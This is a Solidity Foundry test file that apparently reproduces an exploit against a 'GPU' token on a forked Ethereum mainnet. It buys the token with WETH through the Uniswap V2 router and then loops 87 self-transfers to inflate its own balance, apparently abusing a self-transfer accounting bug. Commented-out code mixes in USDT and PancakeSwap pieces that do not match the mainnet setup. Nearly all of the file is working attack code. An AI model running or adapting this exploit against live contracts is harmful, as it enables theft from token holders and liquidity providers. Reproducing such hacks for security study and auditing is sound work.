// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/IUniswapV2.sol";
import "@interface/IUniswapV3.sol";

IERC20 constant gpuToken = IERC20(
    address(0x5116aB7A5166FD4019933BF139195F24E183846E)
);
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

IUniswapV2Pair constant USDT_BNB_V2_Pool = IUniswapV2Pair(
    0xeaf76eC4Dcb96c050390B3bfDb7aC5fd6Dab5d0A
);
IUniswapV2Router constant UNISWAP_V2_ROUTER = IUniswapV2Router(
    payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
);

contract GPUExploit is Test {
    uint32 swapFeeTotal = 10000;
    uint32 swapFeeBase = 25;

    function setUp() external {
        vm.createSelectFork("mainnet");
        deal(address(WETH), address(this), 2 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        // print("USDT before = ", USDT.balanceOf(address(this)), 18);
        // USDT_BNB_V2_Pool.swap(22600 ether, 0, address(this), "0x42");
        // print("USDT After = ", USDT.balanceOf(address(this)), 18);

        WETH.approve(address(UNISWAP_V2_ROUTER), type(uint256).max);
        gpuToken.approve(address(UNISWAP_V2_ROUTER), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(gpuToken);

        uint256 amountOut = UNISWAP_V2_ROUTER.getAmountsOut(1.9 ether, path)[1];
        UNISWAP_V2_ROUTER.swapExactTokensForTokens(
            1.9 ether, // amountIn
            amountOut,
            path,
            address(this),
            block.timestamp
        );

        console.log("===ACK START===");
        for (int i = 0; i < 87; i++) {
            console.log(gpuToken.balanceOf(address(this)));
            gpuToken.transfer(address(this), gpuToken.balanceOf(address(this)));
        }
        console.log("===ACK END===");

        // path[0] = address(gpuToken);
        // path[1] = address(USDT);
        // PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        //     type(uint112).max,
        //     1,
        //     path,
        //     address(this),
        //     block.timestamp
        // );

        // uint256 fee = (amount0 * swapFeeBase) / (swapFeeTotal - swapFeeBase);
        // USDT.transfer(address(USDT_BNB_V2_Pool), amount0 + fee + 1);
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        sender;
        amount0;
        amount1;
        data;
    }
}
